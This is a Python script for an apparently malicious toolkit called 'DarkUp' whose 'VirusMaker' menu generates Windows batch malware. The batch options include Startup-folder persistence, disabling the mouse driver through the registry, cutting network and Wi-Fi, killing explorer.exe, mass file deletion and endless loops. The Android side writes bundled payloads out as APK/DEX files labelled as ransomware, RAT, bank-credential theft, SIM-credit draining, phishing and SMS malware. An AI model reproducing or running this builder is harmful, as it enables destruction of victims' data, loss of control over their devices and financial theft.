import os



if os.name == 'nt':
    os.system('color F')
    os.system("title DarkUp") 
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0"}

def clear_screen():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def slash_system():
    if os.name == 'nt':
        ccvf = "\ "
        return ccvf[:-1]
    else:
        return "/"

#color
class color:
    red = '\033[91m'
    sabz = '\033[92m'
    sefid = '\033[0m'
    narenji = '\033[93m'
    abi_kamrang = '\033[94m'




def virusmaker():
    clear_screen()
    def bnr():
        print('''
    

                 .-.____________________.-.
           ___ _.' .-----.    _____________|    [VirusMaker]>>
          /_._/   (      |   /_____________|
            /      `  _ ____/
           |_      .\( \ 
          .'  `-._/__`_//
        .'       |
       /        /
      /        |
      |        '\.
      |         \.
      `-._____.-'
                                    


    ''')
    clear_screen()
    bnr()
    print("""

   1 >> Virus Android
   2 >> Virus Windows

""")
    mofg = str(input(" >> "))



    if mofg == '2':
        clear_screen()
        bnr()
        pat = input(" Enter   Path + \or/  For Makeing Virus : ")
        namevi = input("\n Enter   name Virus  For Makeing Virus : ")
        pathv = pat + namevi
        print("""


    For  *run virus with  (while True)*   write  *-whilt*
    For     *disconnect Net Target*       write  *-disnet*
    For    *Copy Virus In StartUp*        write  *-cops*
    For   *making new file on Target*     write  *-mkfile*
    For   *making new folder on Target*   write  *-mkdir*
    For         *Try Wi-Fi Off*           write  *-wifio*
    For         *Try Dlet Windows*        write  *-delwin*
    For         *Try Full Memory*         write  *-fulram*
    For         *Try Desktop Off*         write  *-desko*
    For         *Try Mous Off*            write  *-mouso*
    For         *Run a file*              write  *-runf*
    For  *Open a Url on Target System*    write  *-openu*
    For  *Dlet a Processes on Target*     write  *-delproc*
    For  *Dlet a File on Target*          write  *-delfil*
    For  *Making Your Code Bat*           write  *-newbot*
    For  *Show Your Mssage*               write  *-msg*



""")
        modh = input(" >> ")
        clear_screen()
        bnr()
        viru = open(pathv + ".bat", "w+")
        if "-cops" in modh:
            viru.write("\ncopy "+namevi+".bat "+"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup")
            viru.write("\ncopy "+namevi+".bat "+"C:\ProgramData\Microsoft\Windows\Start Menu\Programs")
        if "-whilt" in modh:
            viru.write("\n:kill")
        if "-msg" in modh:
            msggg = input("\n Enter Your Mssage: ")
            viru.write("\nmsg *"+msggg)
        if "-mouso" in modh:
            viru.write('\nset key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"')
            viru.write("\nreg delete %key%")
            viru.write("\nreg add %key% /v Start /t REG_DWORD /d 4")
        if "-disnet" in modh:
            viru.write("\nipconfig /release")
        if "-mkfile" in modh:
            pathfile = input("\n Enter path+name+format new file (your Use   % /+ random + %): ")
            msg = input("\n Enter Mssage For new file (your Use   % /+ random + %): ")
            viru.write("\necho " + str(msg) + " > " +str(pathfile))
        if "-mkdir" in modh:
            pathfolder = input("\n Enter path+name+format new folder (your Use   % /+ random + %): ")
            viru.write("\nmkdir " + str(pathfolder))
        if "-wifio" in modh:
            viru.write("\nnetsh interface set interface Wi-Fi Disabled")
        if "-delwin" in modh:
            viru.write("\ndel c:*.*|y")
        if "-fulram" in modh:
            viru.write("\nc/windows/system32/jefo/display/memory/full")
        if "-desko" in modh:
            viru.write("\nTaskkill -im explorer.exe")
        if "-runf" in modh:
            runnn = input("\n Enter path+name+format file for ran on Target system: ")
            viru.write("\n"+str(runnn))
        if "-openu" in modh:
            runnnurl = input("\n Enter Url for Open on Target system: ")
            viru.write("\nstart iexplore " + str(runnnurl))
        if "-delproc" in modh:
            runnnpro = input("\n Enter Off which processes on Target system: ")
            viru.write("\nTaskkill -im " + str(runnnpro))
        if "-delfil" in modh:
            runnndel = input("\n Enter name File For Dlet File on Target system: ")
            viru.write("\nDel " + str(runnndel))
        if "-newbot" in modh:
            codessutp = input("\n Enter Your code bat: ")
            viru.write("\n" + codessutp)
        if "-whilt" in modh:
            viru.write("\ngoto:kill")
        viru.close()
    

    elif mofg == '1':
        clear_screen()
        bnr()
        print("""

   
   1 >> Proxy Virus

   2 >> Virus encryption of files and rat

   3 >>  !!Unknown virus!!

   4 >> Virus Info Getrt

   5 >> Virus Anty Delete

   6 >> Bomber notification

   7 >> Download the virus and run

   8 >> Empty SIM card credit

   9 >> Encryption and anti-deletion at boot

   10>> encryption of files and rat

   11>> espionage Of Target

   12>> GooglPlay Virus

   13>> Malicious code injection

   14>> Post fishing pages To Target

   15>> Reset the phone and anti-program

   16>> sms virus

   17>> Stealing bank information

   18>> Vius Send Sms anty Delete

""")
        nb_ll = str(input(" >> "))
        path_Viru = os.getcwd() + slash_system() + "Virus_Maker_An" + slash_system()


        if nb_ll == "1":
            path_Viru = path_Viru+"Proxy_Virus"+".txt"
        elif nb_ll == "2":
            path_Viru = path_Viru+"encryption of files and rat"+".txt"
        elif nb_ll == "3":
            path_Viru = path_Viru+"Unknown virus"+".txt"
        elif nb_ll == "4":
            path_Viru = path_Viru+"anonymous Geter Infi"+".txt"
        elif nb_ll == "5":
            path_Viru = path_Viru+"Anty Del"+".txt"
        elif nb_ll == "6":
            path_Viru = path_Viru+"Bomber notification"+".txt"
        elif nb_ll == "7":
            path_Viru = path_Viru+"Download the virus and run"+".txt"
        elif nb_ll == "8":
            path_Viru = path_Viru+"Empty SIM card credit"+".txt"
        elif nb_ll == "9":
            path_Viru = path_Viru+"Encryption and anti-deletion at boot"+".txt"
        elif nb_ll == "10":
            path_Viru = path_Viru+"encryption of files and rat"+".txt"
        elif nb_ll == "11":
            path_Viru = path_Viru+"espionage"+".txt"
        elif nb_ll == "12":
            path_Viru = path_Viru+"GooglPlay Virus"+".txt"
        
        elif nb_ll == "13":
            path_Viru = path_Viru+"Malicious code injection"+".txt"
        elif nb_ll == "14":
            path_Viru = path_Viru+"Post fishing pages"+".txt"
        elif nb_ll == "15":
            path_Viru = path_Viru+"Reset the phone and anti-program"+".txt"
        elif nb_ll == "16":
            path_Viru = path_Viru+"sms virus"+".txt"
        elif nb_ll == "17":
            path_Viru = path_Viru+"Stealing bank information"+".txt"
        elif nb_ll == "18":
            path_Viru = path_Viru+"Vius Send Sms anty Del"+".txt"
        else:
            print("\n\n\n [!] Error  Enter It Number ! \n\n")
        

        ppkw = str(input("\n\n\n Enter  Path+\or/+name  : "))
        if nb_ll == "13":
            ppkww = ppkw + ".dex"
        else:
            ppkww = ppkw + ".apk"

        apk_open = open(path_Viru, "rb")
        apk_open_data = apk_open.read()
        apk_open.close()

        txt_open = open(ppkww, "wb")
        txt_open.write(apk_open_data)
        txt_open.close()
        print(" OK :0")





    input("\n\n\tEnter for close ")
    clear_screen()
# ===============================================================================  
virusmaker()
